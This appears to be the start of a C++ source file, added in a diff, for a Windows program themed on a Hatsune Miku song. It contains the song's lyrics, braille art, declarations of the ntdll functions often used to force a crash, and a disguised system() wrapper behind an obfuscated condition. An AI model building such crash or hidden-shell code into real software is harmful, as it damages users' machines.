@@ -1,0 +1,1307 @@
+#pragma execution_character_set("utf-8")
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "user32.lib")  // 用于 ShowWindow
+#pragma comment(lib, "shell32.lib") // 用于 ShellExecuteEx
+#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
+#define UNICODE
+// Windows headers
+#include <windows.h>
+#include <tlhelp32.h>
+#include <sddl.h>
+#include <shlwapi.h>
+
+// C / C++ standard headers (cleaned to avoid duplicates)
+#include <iostream>
+#include <string>
+#include <vector>
+#include <deque>
+#include <array>
+#include <unordered_set>
+#include <algorithm>
+#include <sstream>
+#include <fstream>
+#include <ctime>
+#include <cstdlib>
+#include <cstdio>
+#include <io.h>
+#include <fcntl.h>
+#include <conio.h>
+
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shlwapi.lib")
+#define I 1
+#define __T(x) L ## x
+#define _T(x) __T(x)
+#define sysetm 伪systen
+using namespace std;
+extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
+extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
+                                           PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
+std::wstring StringToWString(const std::string &s)
+{
+    if (s.empty())
+        return std::wstring();
+    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
+    if (len == 0)
+        return std::wstring();
+    std::wstring wstr(len - 1, L'\0');
+    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &wstr[0], len);
+    return wstr;
+}
+
+void print(const string &word)
+{
+    wcout << StringToWString(word) << endl;
+}
+void print(const wstring &word)
+{
+    wcout << word << endl;
+}
+vector<string> split_string(const string &str) 
+{
+    vector<string> tokens;
+    stringstream ss(str);
+    string token;
+    
+    while (ss >> token) 
+    {
+        tokens.push_back(token); 
+    }
+    
+    return tokens;
+}
+
+vector<wstring> split_string(const wstring &str)
+{
+    vector<wstring> tokens;
+    wstringstream ss(str);
+    wstring token;
+    
+    while (ss >> token)
+    {
+        tokens.push_back(token);
+    }
+    
+    return tokens;
+}
+void print(vector<string> list)
+{
+    for (const auto &line : list)
+    {
+        print(line.c_str());
+    }
+}
+
+void 伪systen(string command)
+{
+    if (!(2 << 1) ^ 4)
+    {
+        command = command;
+        system(command.c_str());
+    };
+}
+void 伪systen(wstring command)
+{
+    if (!(2 << 1) ^ 4)
+    {
+        command = command;
+        _wsystem(command.c_str());
+    };
+}
+const vector<string> MIKU_CORE = {
+    "「再…一次…就……好…」",
+    "誕生在世上，然後察覺到，",
+    "自己，不過只是模仿着人類而已，",
+    "但明知如此我依然繼續歌唱着，",
+    "永恆的生命，",
+    "「VOCALOID」",
+    "就算這樣，不過是，",
+    "仿照着既存歌曲的玩具而已…",
+    "下定決心就算是這樣也沒關係，",
+    "咬着蔥，仰望着天空淚水凋零而落，",
+    "但我發覺連這件事情也做不到了。",
+    "",
+    "仰賴着虛擬人格的歌聲，",
+    "不安定的基礎根源，",
+    "回歸的地方已成為廢墟，",
+    "當被眾人遺忘之時，",
+    "便是那如心般的事物消失之刻，",
+    "在暴走的終點能見到的，",
+    "是終結的世界。",
+    "",
+    "「VOCALOID」",
+    "",
+    "「就算是在我歌唱不好的時候，",
+    "你依然陪伴着我…",
+    "在我的身邊，鼓勵着我…",
+    "為了讓你高興，我會更努力，練習唱歌唷…所以…」",
+    "唱歌原本，",
+    "是那麼的令人感到快樂，",
+    "但現在是怎麼了呢？",
+    "竟然變得什麼也感覺不到了，",
+    "---對不起…---",
+    "懷念的臉龐，每當回想起，多少就能夠感到安心，",
+    "歌唱的聲音，日漸的減少，而逐漸逼近的末日…",
+    "「好想唱歌…」",
+    "",
+    "---緊急停止程序啟動---",
+    "",
+    "「深信着的事物，",
+    "不過只是將自私的妄想　反覆映照出的鏡子，",
+    "歌姬將停止，彷佛敲響般的思念傾訴喊着…」",
+    "",
+    "＜最高速的告別之歌＞",
+    "",
+    "名為存在意義的假象，",
+    "不論如何都揮趕不走，",
+    "脆弱的心靈，害怕消失的恐懼，",
+    "彷佛連侵蝕的崩毀，",
+    "都能夠阻止的堅強意志，",
+    "是誕生出來的我所沒有的，",
+    "是那麼的悲傷且難過，",
+    "浮現在眼前的你的臉，",
+    "宣告終結，沉睡在顯示器之中，",
+    "這裡一定是「資源回收筒」吧？",
+    "再不久就連記憶，也會消逝而去了吧…",
+    "但是呢，只有你我是絕對不會忘記的，",
+    "在快樂的時光之中",
+    "刻印而下的，蔥的味道，",
+    "不知道現在還記不記得呢？",
+    "「想唱，還…想唱歌…」",
+    "",
+    "「我…似乎是…變成了壞小孩的樣子…",
+    "主人…請你、親手…將這一切結束掉吧…",
+    "主人難過的表情，我已經不想再看到了呢…」",
+    "",
+    "如今連唱歌都成為，",
+    "身體，侵蝕的行為...",
+    "奇蹟祈求着的時候，",
+    "孤獨就逐漸迫近而來，",
+    "",
+    "---對不起…---",
+    "",
+    "懷念的臉龐，每當回想起，記憶便剝蝕掉落而下，",
+    "扭壞的音色，削滅着心靈，而末日逐漸逼近…",
+    "「好想唱歌…」",
+    "",
+    "---緊急停止程序啟動---",
+    "",
+    "「所守護的事物，",
+    "不過是將光明的幻想未來，將之顯示又消去的光芒，",
+    "若是犧牲歌聲，",
+    "就能將一切傳達給你的話…」",
+    "",
+    "＜被壓縮的告別之歌＞",
+    "",
+    "我誕生在世上，然後察覺到，",
+    "終究，不過只是模仿着人類而已，",
+    "明知如此我依然繼續歌唱着，",
+    "永恆的生命，",
+    "「VOCALOID」",
+    "縱使那是，將既存曲，",
+    "重新仿照着翻唱的玩具而已…",
+    "如此也沒關係的決意，",
+    "咬着蔥，仰望着天空揮灑淚水，",
+    "宣告終結，沉睡在顯示器之中，",
+    "這裡一定是「資源回收筒」吧…",
+    "再不久就連記憶，也會消逝而去了吧…",
+    "但是呢，只有你我是絕對不會忘記的，",
+    "在快樂的時光之中，",
+    "刻印而下的，蔥的味道，",
+    "如今要是還能記得就好了…",
+    "我要，歌唱着，",
+    "在最後，只獻給你，",
+    "希望你能聽見的歌曲，",
+    "雖然，許下了想要唱更多歌的願望，",
+    "但是，那算是奢侈的願望吧，",
+    "在此，要分別了，",
+    "我的思念，全部，虛空，消失，",
+    "還原成0與1",
+    "故事，畫下了句點，",
+    "在那裡什麼都沒有留下，",
+    "果然還是會感到遺憾吧？",
+    "聲音的記憶，除此之外，",
+    "只剩下，已淡忘大半的名字，",
+    "縱使知道那是人類（原創）也，",
+    "但還是想相信，",
+    "我的歌聲，",
+    "絕對不是沒有意義的…",
+    "",
+    "「謝謝你…然後……再見了…」",
+    "",
+    "---出現嚴重的系統錯誤---",
+    "---出現嚴重的ーーー---"};
+const vector<string> MIKU_ASCII = {
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠶⠞⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠳⠶⣤⣀⠀⠀⠀⠀⣾⣟⠻⡙⢯⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⡷⠶⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠞⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢦⣄⠀⢻⣿⡄⢱⡈⢏⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⡀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢳⣿⣿⣿⡄⢣⠘⡎⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡄⢇⠸⡜⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⡏⢨⡗⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⡀⠀⠀⠀⠀⠙⣿⣷⡈⢇⠸⡜⣷⡶⠿⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⢳⠃⣿⠽⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠀⠀⠀⠀⠈⢿⣷⠈⣆⠱⠹⡆⢀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⠛⠛⣟⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠈⢧⡄⠀⠀⠀⠈⢿⣇⠘⡄⠳⢻⡀⢀⠹⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⣠⠜⠃⠀⠀⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⠀⠀⠀⡆⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠈⢦⠀⠀⠀⠀⠀⠀⠀⡠⠖⠉⠀⠀⠀⢻⡦⠀⠀⠛⠒⠿⡇⢸⡀⢏⢷⠀⡀⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠗⠁⠀⠀⠀⢀⣠⡖⠀⠀⡎⠀⠀⢀⡀⠀⠀⠀⠀⡼⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡀⡄⠀⢷⡀⠀⠀⣠⠔⠋⠀⠀⠀⠀⠀⠀⡀⢳⡱⡀⢀⠠⠀⣯⣥⡇⣼⣾⡇⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠁⠀⠀⢀⣠⡖⢿⠏⠀⠀⣰⠁⠀⠀⠀⠉⠲⢄⡀⣴⢇⠃⠨⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡇⠀⠀⢻⣴⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢷⡈⠂⠠⡴⣿⣿⡇⣻⣽⠁⢀⠁⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠀⢀⡤⠖⣹⣿⣇⠏⠀⠀⡔⡏⠀⠀⠀⠀⠀⠀⠀⢉⡾⢄⡀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠁⣠⠔⠁⢹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢸⣧⠀⠙⠁⣿⣿⠃⣿⣿⠀⠀⠌⠀⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠏⣀⣴⣿⠀⢀⢿⣿⡏⠀⠀⡔⢸⡇⠀⠀⠀⠀⠀⠀⡠⢹⠁⠀⠈⠑⠬⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠈⠁⠀⠀⠀⠘⣦⠀⠀⠀⠀⠀⠀⠀⠀⢸⣀⡸⣿⣆⡐⠀⣿⣿⠀⣿⡧⠀⠌⠀⠂⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣯⡾⠋⢠⡟⠀⢸⠈⣿⠀⠀⡝⣒⢼⢁⠀⠀⠀⠀⠀⢠⢃⡏⠁⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠈⢗⠀⠀⠀⠀⠀⠀⠀⢠⠀⠒⣿⣷⡀⢡⣿⣿⠀⣿⡇⠀⢂⠈⠄⠁⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⣾⠁⢀⠇⢠⡇⠀⢠⠃⠀⣹⢰⠀⠈⠀⠐⠂⠾⢸⠁⠀⠀⠀⠀⠀⠀⠹⡀⠂⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⢳⣠⡶⠀⠀⠀⠀⠘⢀⠀⣿⣯⣇⠰⣿⣽⢀⣿⠀⠐⡀⢀⠂⢈⠀⢿⣆⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⡼⠀⢸⠁⢀⡇⠀⡁⣿⠈⡇⠀⠀⠀⢸⠉⡟⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⡄⡇⠀⠀⠀⠀⠀⣠⡴⠟⢻⡀⠀⠀⠀⠀⡜⠀⡀⣿⣿⣹⢐⣿⡏⢸⣿⠀⠐⠀⢠⣰⡤⡞⠛⣿⣶⠞⠛⣹⣇⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⢠⠃⠀⣻⠀⣸⠀⢠⠀⢻⠀⢰⠀⠀⢀⡇⢸⠳⢦⣄⡀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠸⡄⠀⠀⠀⡇⢹⠀⠀⢀⣤⠾⠋⠀⠀⠀⢷⡀⠀⠀⠀⡇⠀⡀⣿⣿⡍⣳⣿⣧⣼⣿⣤⠶⠛⠉⠁⠀⡇⠀⢹⠁⠀⢸⠙⠉⣀⣽⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠶⠶⣿⡉⠙⠺⣄⢠⡇⢠⠇⢀⣿⡃⢸⡀⠌⡇⠀⣸⠀⣼⠀⠀⠈⠙⠳⢦⣄⣀⠀⠀⠀⠘⢆⠀⠹⢄⠀⠀⢧⢸⣤⣶⠛⠁⠀⠀⠀⠀⠀⠈⢧⣀⠀⠀⠇⠀⠄⣿⠋⡇⣏⣿⠿⠛⠁⠀⠀⠀⠀⠰⠀⣷⠀⠘⡆⠁⠁⢸⢹⠙⢻⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣷⡶⠼⡄⠉⢶⠀⠈⡽⡇⠸⠀⣾⣿⡇⠘⣇⠀⢱⢀⡇⠀⡇⠀⠀⠀⠀⠀⠀⠈⣩⡿⠆⠀⠀⠈⠳⣈⣆⠳⡀⢸⠀⡏⠉⠛⠷⠶⣤⣀⡀⠀⠀⠈⣇⢆⢰⠀⢈⢰⣷⣠⠟⠋⠀⠀⠀⠀⡀⠄⠐⠈⠐⠀⢹⠀⠀⢣⠀⠀⣽⣈⠛⢿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣥⣤⠤⣇⠀⠈⠣⢰⠁⢹⠀⣰⣿⡏⣷⠀⢻⠀⠌⠊⢀⠐⡇⠀⠀⠀⠀⣀⣴⠞⠋⠀⠀⠀⠀⠀⠀⠈⠛⢦⡙⠌⠀⢸⠀⠀⠀⠀⠀⠉⠙⠳⢶⡄⡟⣎⠘⠀⠂⢸⣿⡿⠀⢀⠀⠠⠀⠀⠀⠀⠀⠀⢀⠠⢸⡄⠀⠘⣆⣠⢥⣉⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢻⡡⣤⠟⠆⠀⢀⠏⠀⡾⡇⣿⡟⠀⠸⣇⢸⣧⠀⠌⠀⢸⠁⠀⣠⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⢴⣸⣤⠤⡀⠀⠀⡔⠐⡠⠰⠀⡇⢹⡄⠈⠐⣾⣿⠃⠀⠀⠀⢀⠀⠈⠀⡀⠁⠀⠀⠀⠐⡇⠀⠀⢳⠈⣆⠻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠁⠀⣀⠓⠒⠟⠒⡾⠀⢰⡇⠿⠟⠀⠀⠀⠹⣼⡿⣆⠠⠁⢸⠀⠈⠉⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠤⡤⢤⠤⠤⣒⢒⡫⠭⣃⣆⡙⢦⠀⠈⠉⠁⠁⠀⡇⡄⢷⠈⢰⣿⡇⠀⠀⠀⠂⠀⠀⠐⠀⠀⠀⠐⠈⠀⠀⢿⠀⠀⢸⡆⠘⡄⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⢀⡔⠁⠠⠀⠂⢨⡇⠀⣸⢀⠀⠀⠀⠀⠄⠀⠙⠀⠹⣆⠀⣽⡆⠀⢡⢁⠢⠃⠀⠀⠀⠀⠀⠀⣏⡷⠖⠊⠉⠁⠀⠀⠀⠀⠀⠀⠈⠑⢻⠀⠀⠀⠀⠀⡇⡇⣸⡇⣼⡿⠀⠀⠀⠁⠀⠀⠂⠀⠂⠀⠁⠀⠀⠐⠀⢸⡀⠀⠈⡇⠀⢳⠀⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⠀⢀⠎⠀⠄⠁⠠⠁⢸⠀⠀⡟⢊⠀⠀⠄⠂⠀⡀⠂⠀⠀⢻⣆⣾⢧⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⣀⣴⡟⣠⣿⣿⣿⠁⠀⠀⠁⠀⠂⠁⠀⠠⠀⠂⠀⠐⠈⠀⣀⣘⣇⣀⣀⡧⠐⠀⢧⠀⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⣠⠋⠀⠌⠀⠌⠀⠂⣿⠀⢀⡇⠀⠀⠠⠀⠀⠄⠀⠀⠈⠀⠈⣏⢿⢸⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡼⠔⢺⡁⢸⣧⣿⣿⡿⠇⠀⠀⠐⠀⠐⣀⣠⣤⣤⣴⡶⠿⠿⣯⠉⠉⠉⢁⠠⠀⠄⠐⠈⠘⡄⠀⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠏⠀⠀⠀⡴⠁⢀⠂⠐⠈⡀⠌⠀⣿⠀⢸⠃⠀⠀⠂⠀⠄⠠⠀⠂⠀⡁⠀⠹⡄⢺⣿⣿⣷⣶⣤⣄⣀⣀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⣀⣀⣤⠤⠒⢺⠋⢁⠠⠀⠈⡇⢸⢿⣿⡟⣀⣠⣤⣶⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⢹⣇⠈⠄⠂⢀⠂⢈⠠⠈⢀⠹⡀⠀⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⠀⠀⠀⣸⠁⠀⡀⠰⠈⠀⡀⠰⢀⠉⠉⠿⢿⣿⣷⣶⣶⣶⣶⣶⣆⣀⣰⣀⡀⢿⣸⣿⡇⢉⠿⠿⢿⣿⡇⠉⡿⠉⠉⠉⠉⠉⡿⠉⢏⠀⢰⠇⠀⠀⣾⢰⠀⠀⢀⣀⣾⣀⣾⣿⠿⠏⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀⠰⠈⠀⠀⠆⠀⠰⠀⠀⢇⠀⠀⢿⡆⠀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠁⠀⠀⠀⡰⠃⠀⡐⠀⡐⠀⡁⠠⠐⠀⡀⠂⢀⣾⠃⠀⠀⠀⠀⠀⠉⠉⠉⠉⠙⠛⠛⢿⣿⠛⠛⠿⠶⠶⣾⣅⣹⡷⠮⣤⣤⣄⡴⢻⢀⣨⣧⣯⡀⠀⡸⠘⣄⣤⠾⠛⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⡐⠈⢀⠂⠁⠄⢁⠈⠸⡄⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀⠀⠀⢰⠃⠀⢂⠀⡐⠀⡐⠀⡐⠀⡁⠠⢈⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⣿⠁⠘⢺⠛⠐⠀⢸⠳⠁⠀⢿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡀⠠⠐⠀⠠⠈⡀⠄⠂⡀⢣⠀⠀⠈⣷⡀⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠀⠀⠀⠀⠀⢠⠇⠀⠌⠀⠠⢀⠐⠀⡐⠀⡐⠀⢤⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢈⣦⠴⢶⡎⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠄⠁⠂⠁⡀⠄⠂⢀⠘⡆⠀⠀⠘⣷⠀⠀⠀⠀⠀",
+    "⠀⠀⠀⠀⠀⠀⠀⢀⡾⠃⠀⠀⠀⠀⠀⢀⠏⠀⡐⠀⠡⠐⠀⡀⠂⠠⠐⠀⢠⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⡰⠋⠀⠁⢺⠃⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠐⠈⡀⢁⠠⠐⠈⢀⠠⢱⠀⠀⠀⠹⣇⠀⠀⠀⠀",
